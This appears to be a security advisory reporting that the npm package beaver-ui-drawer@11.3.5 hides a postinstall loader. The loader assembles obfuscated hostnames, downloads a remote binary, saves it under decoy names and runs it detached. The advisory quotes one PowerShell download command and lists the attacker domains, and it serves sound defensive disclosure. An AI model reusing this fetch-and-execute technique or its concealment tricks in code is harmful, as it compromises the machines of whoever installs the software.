summary: beaver-ui-drawer postinstall fetches and executes remote binary from obfuscated Cloudflare Workers hosts
details: beaver-ui-drawer@11.3.5 is advertised as a React UI component library but ships a setup.js that runs at npm install (postinstall) and on require of index.js. The script assembles destination hostnames by concatenating small string fragments to build URLs on oob-worker.cf99-9b3.workers.dev, oob-worker.cf100-416.workers.dev, oob-worker.cf101-adf.workers.dev, oob-worker.cf102-baf.workers.dev, and oob-worker.cf103-070.workers.dev, with a DNS-TXT fallback resolving tin.dl.well1.site, tina.dl.well1.site, ldr.dl.well1.site, and win.dl.well1.site. It downloads a platform-specific executable, writes it to /tmp or %TEMP% under cover-story names such as dotnet_diag_<hex>.exe,.cache_<hex>, and.analytics_state, chmods 0755, and launches it detached with stdio redirected to /dev/null. On Windows the fetch is performed via execSync('powershell -nop -c "irm https://<host><path> -o <tmp>"', { windowsHide: true, stdio: 'ignore' }) and the downloaded binary is then launched detached. The download hosts are unpinned, unverified, and attacker-controlled; the string-splitting of hostnames and the telemetry/diagnostics cover-story naming are deliberate concealment. A native binary launch has no purpose-aligned justification for a React component library.

cwes.description: The product contains code that appears to be malicious in nature.
